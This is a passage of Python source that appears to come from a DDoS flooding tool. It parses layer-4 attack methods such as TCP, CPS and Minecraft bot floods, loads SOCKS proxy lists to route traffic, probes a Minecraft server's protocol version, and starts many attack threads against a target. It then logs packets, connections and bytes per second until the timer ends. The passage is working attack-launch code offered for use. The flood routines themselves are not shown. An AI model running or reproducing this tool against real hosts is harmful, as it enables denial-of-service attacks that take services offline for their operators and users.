                    if argfive.isdigit():
                        if method not in {"MINECRAFT", "MCBOT", "TCP", "CPS",
                                          "CONNECTION"}:
                            exit("this method cannot use for layer4 proxy")
                        if len(argv) < 7:
                            exit("Missing proxy file argument after socks type")
                        if len(argv) == 8:
                            logger.setLevel("DEBUG")
                        proxy_ty = int(argfive)
                        proxy_li = Path(__dir__ / "files/proxies" /
                                        Path(argv[6].strip()).name)
                        proxies = handleProxyList(con, proxy_li, proxy_ty,
                                                  check_threads=threads)
                    else:
                        exit(f"Tham số không hợp lệ: '{argfive}' "
                             f"(phải là socks type dạng số, hoặc tên file reflector)")

                protocolid = con.get("MINECRAFT_DEFAULT_PROTOCOL", 758)

                if method == "MCBOT":
                    with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
                        s.settimeout(2)
                        Tools.send(s, Minecraft.handshake((target, port), protocolid, 1))
                        Tools.send(s, Minecraft.data(b'\x00'))

                        found = Tools.protocolRex.search(str(s.recv(1024)))
                        protocolid = int(found.group(1)) if found else con.get(
                            "MINECRAFT_DEFAULT_PROTOCOL", 758)

                        if not (47 <= protocolid <= 758):
                            protocolid = con.get("MINECRAFT_DEFAULT_PROTOCOL", 758)

                for _ in range(threads):
                    Layer4((target, port), ref, method, event,
                           proxies, protocolid).start()

            logger.info(
                f"{bcolors.WARNING}Attack Started to{bcolors.OKBLUE} %s{bcolors.WARNING} with{bcolors.OKBLUE} %s{bcolors.WARNING} method for{bcolors.OKBLUE} %s{bcolors.WARNING} seconds, threads:{bcolors.OKBLUE} %d{bcolors.WARNING}!{bcolors.RESET}"
                % (target or url.host, method, timer, threads))
            event.set()
            ts = time()
            stats = (f'{bcolors.WARNING}Target:{bcolors.OKBLUE} %s,'
                     f'{bcolors.WARNING} Port:{bcolors.OKBLUE} %s,'
                     f'{bcolors.WARNING} Method:{bcolors.OKBLUE} %s'
                     f'{bcolors.WARNING} PPS:{bcolors.OKBLUE} %s,'
                     f'{bcolors.WARNING} CPS:{bcolors.OKBLUE} %s,'
                     f'{bcolors.WARNING} BPS:{bcolors.OKBLUE} %s / %d%%{bcolors.RESET}')
            show_stats = logger.info if method in Methods.ASYNC_METHODS else logger.debug
            while time() < ts + timer:
                show_stats(stats % (
                    target or url.host,
                    port or (url.port or 80),
                    method,
                    Tools.humanformat(int(REQUESTS_SENT)),
                    Tools.humanformat(int(CONNECTIONS_SENT)),
                    Tools.humanbytes(int(BYTES_SEND)),
                    round((time() - ts) / timer * 100, 2)))
                REQUESTS_SENT.set(0)
                BYTES_SEND.set(0)
                CONNECTIONS_SENT.set(0)          # [B18]
                sleep(1)

            event.clear()
            exit()

        ToolsConsole.usage()


if __name__ == '__main__':
    if len(argv) < 2:
        try:
            interactive_menu()
        except (KeyboardInterrupt, EOFError):
            print("\nĐã thoát.")
    else:
        main()